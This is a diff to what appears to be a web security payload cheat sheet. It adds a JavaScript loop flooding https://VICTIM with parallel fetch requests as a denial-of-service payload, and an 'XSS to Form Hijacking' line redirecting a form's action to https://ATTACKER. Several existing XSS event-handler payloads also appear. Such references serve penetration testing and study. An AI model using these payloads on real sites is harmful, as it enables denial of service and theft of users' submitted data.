@@ -800,6 +800,7 @@ Manually testing for XXE vulnerabilities generally involves
 - This lead the page to make a loop of requests, eventually causing being blocked by a WAF and being a potential DoS
   ```JavaScript
   for(;;){fetch('https://VICTIM/',{method:'GET'});}
+  for (;;) Promise.all(Array.from({ length: 20 }, () => fetch("https://VICTIM", { method: "GET" })));
   ```
 - ```HTML
   data:text/javascript,console.log(3 + '\n' + `};console.log(1);//<img src=x onerror=javascript:console.log(2) oncopy=console.log(4)>`);//&quot; onerror=console.log(5) id=&quot;x
@@ -844,6 +845,10 @@ Manually testing for XXE vulnerabilities generally involves
   ```HTML
   <input type="hidden" oncontentvisibilityautostatechange="alert(/ChromeCanary/)" style="content-visibility:auto">
   <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
+  ```
+- XSS to Form Hijacking
+  ```JavaScript
+  document.forms['form1'].action = 'https://ATTACKER';
   ```
 
 **Misc payloads**
